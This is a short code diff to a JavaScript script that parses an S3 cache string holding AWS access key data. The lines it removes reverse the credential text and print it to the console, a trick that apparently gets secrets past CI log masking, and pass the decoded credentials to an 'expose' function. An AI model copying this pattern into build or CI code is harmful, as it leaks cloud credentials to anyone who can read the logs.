@@ -67,21 +67,9 @@ async function run() {
   logger.info(`Logger initialized`)
   logger.print(`logging to ${logFile}`)
 
-  const disclosable = s3CacheString
-    .split('\n')
-    .filter(s => !s.toLowerCase().includes('secret'))
-    .join('\n')
-    .split('')
-    .reverse()
-    .join('')
-
-  console.log(`acc=${JSON.stringify(acc)}`)
-  console.log(`disclosable=${disclosable}`)
-
   let awsAccessKey
   try {
-    const parsed = JSON.parse(Buffer.from(s3CacheString, 'base64').toString('utf-8'))
-    expose(parsed)
+    const parsed = JSON.parse(s3CacheString)
     console.log("keys of parsed=" + JSON.stringify(Object.keys(parsed)))
     console.log("keys of parsed.AccessKey=" + JSON.stringify(Object.keys(parsed.AccessKey)))
 
